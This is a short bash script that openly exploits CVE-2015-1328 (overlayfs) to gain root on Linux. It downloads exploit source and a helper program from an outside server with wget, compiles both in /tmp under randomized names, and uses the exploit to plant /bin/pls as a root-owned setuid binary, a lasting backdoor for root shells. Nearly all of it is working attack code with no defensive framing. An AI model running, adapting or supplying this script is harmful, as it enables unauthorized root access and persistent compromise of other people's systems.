#!/bin/bash
# This utilizes CVE-2015-1328 (overlayfs) to escalate to root
# Can be run by any unprivileged user to spawn a root shell
# Unlike CVE-2016-5195 (dirtycow), this one does NOT crash the machine
name="ofs-$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 10)"
# wget http://www.exploit-db.com/download/37292 -O "/tmp/$name.c"
wget http://${server_ip}:8000/ofs.c -O "/tmp/$name.c"
gcc /tmp/$name.c -o /tmp/$name
rm /tmp/$name.c
wget http://${server_ip}:8000/pls.c -O /tmp/pls.c
gcc /tmp/pls.c -o /tmp/pls
rm /tmp/pls.c
echo 'mv /tmp/pls /bin/pls &&\
chown root:root /bin/pls &&\
chmod 711 /bin/pls &&\
chmod u+s /bin/pls' | "/tmp/$name"